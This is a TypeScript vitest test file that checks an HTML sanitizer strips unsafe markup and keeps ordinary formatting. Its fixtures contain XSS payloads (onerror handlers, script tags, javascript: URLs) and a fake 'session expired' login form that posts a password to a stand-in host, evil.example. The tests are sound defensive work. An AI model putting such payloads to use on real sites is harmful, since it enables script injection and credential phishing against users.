/*
 * Copyright 2026 QRun.IO, Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

import { describe, expect, it } from 'vitest'
import { sanitizeHtml } from './sanitize-html'

/**
 * Parses sanitized HTML for structural assertions.
 *
 * @param html - Sanitized HTML.
 * @returns A container element holding it.
 */
function parse(html: string): HTMLElement {
  const container = document.createElement('div')
  container.innerHTML = html
  return container
}

describe('sanitizeHtml (QRun-IO/qqq#696)', () => {
  it('keeps ordinary formatting, links, images, tables and inline styles', () => {
    const html = '<p style="color: red; text-align: center">Hi <b>bold</b> <i>it</i> <u>u</u> <a href="https://example.com/a">link</a></p>'
      + '<ul><li>one</li></ul><table><tbody><tr><td>cell</td></tr></tbody></table><img src="/logo.png" alt="Logo">'
    const clean = parse(sanitizeHtml(html))
    expect(clean.querySelector('p')?.getAttribute('style')).toBe('color: red; text-align: center')
    expect(clean.querySelector('a')?.getAttribute('href')).toBe('https://example.com/a')
    expect(clean.querySelectorAll('b, i, u, li, td, img')).toHaveLength(6)
  })

  it('removes scripts, event handlers and javascript: URLs (DOMPurify defaults)', () => {
    const clean = sanitizeHtml('<img src="x" onerror="alert(1)"><script>alert(2)</script><a href="javascript:alert(3)">x</a><svg><script>alert(4)</script></svg>')
    expect(clean).not.toMatch(/onerror|<script|javascript:|alert/)
  })

  it('removes style elements, forms and form controls', () => {
    const clean = parse(sanitizeHtml(
      '<style>body { display: none }</style><form action="https://evil.example/collect" method="post">'
      + '<p>Your session expired</p><input type="password" name="password"><textarea></textarea>'
      + '<select><option>a</option></select><button formaction="https://evil.example">Sign in</button></form><dialog open>d</dialog>'
    ))
    expect(clean.querySelectorAll('style, form, input, textarea, select, option, button, dialog')).toHaveLength(0)
    expect(clean.innerHTML).not.toMatch(/evil\.example|display: none/)
    expect(clean.textContent).toContain('Your session expired')
  })

  it.each([
    'position: fixed; inset: 0; z-index: 9999; background: white',
    'position:absolute;top:0;left:0',
    'position: STICKY; top: 0',
    'position: fixed !important; top: 0',
  ])('drops positioning that can cover the page: %j', (style) => {
    const element = parse(sanitizeHtml(`<div style="${style}">Sign in again</div>`)).querySelector('div')
    expect(element?.style.position ?? '').toBe('')
    expect(element?.textContent).toBe('Sign in again')
  })

  it('keeps static and relative positioning and removes an emptied style attribute', () => {
    expect(parse(sanitizeHtml('<span style="position: relative; top: 2px">x</span>')).querySelector('span')?.style.position).toBe('relative')
    expect(parse(sanitizeHtml('<span style="position: fixed">x</span>')).querySelector('span')?.hasAttribute('style')).toBe(false)
  })

  it('accepts a URI allow-list override (process CSV templates)', () => {
    const csv = '<a href="data:text/csv;base64,YSxi" download="t.csv">template</a>'
    expect(sanitizeHtml(csv)).not.toContain('data:text/csv')
    expect(sanitizeHtml(csv, { allowedUriRegexp: /^(?:https?:|data:text\/csv[;,])/i })).toContain('data:text/csv;base64,YSxi')
  })

  it('returns an empty string for empty input', () => {
    expect(sanitizeHtml('')).toBe('')
    expect(sanitizeHtml(null)).toBe('')
    expect(sanitizeHtml(undefined)).toBe('')
  })
})
